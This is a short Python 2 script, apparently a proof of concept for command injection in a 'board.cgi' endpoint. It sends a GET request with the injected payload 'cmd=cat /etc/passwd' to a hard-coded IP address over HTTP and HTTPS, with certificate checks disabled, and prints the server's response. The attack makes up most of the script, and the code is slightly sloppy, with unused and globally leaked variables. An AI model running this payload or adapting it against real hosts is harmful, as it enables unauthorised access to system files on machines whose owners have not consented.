# !/usr/bin/env python
# -*- coding:utf-8 -*-


import requests


def check_vul(**data):
    useragent = ''
    if 'url' in data.keys() and 'hostname' in data.keys():
        httpurl = 'http://'+data['hostname'] + data['url']
        httpsurl = 'https://'+data['hostname'] + data['url']
    else:
        return 'no hostname or url'
    if 'method' in data.keys():
        if data['method'].lower() == 'get':
            # get 方式进行验证
            r_http = requests.get(httpurl, headers = headers)
            r_https = requests.get(httpsurl, headers = headers, verify = False)
            if r_http.status_code == 200:

                print r_http.status_code, r_http.text, r_http.content
            if r_https.status_code == 200:
                print r_https.status_code, r_https.text, r_https.content

    pass


if __name__ == '__main__':
    header = headers = {'user-agent': 'my-app/0.0.1'}
    url = '/board.cgi?cmd=cat%20/etc/passwd'
    hostname = '114.113.67.49'
    port = ''
    postdata = ''
    method = 'GET'
    check_vul(url = url, hostname = hostname, port = port, postdata = postdata, header = header, method = method )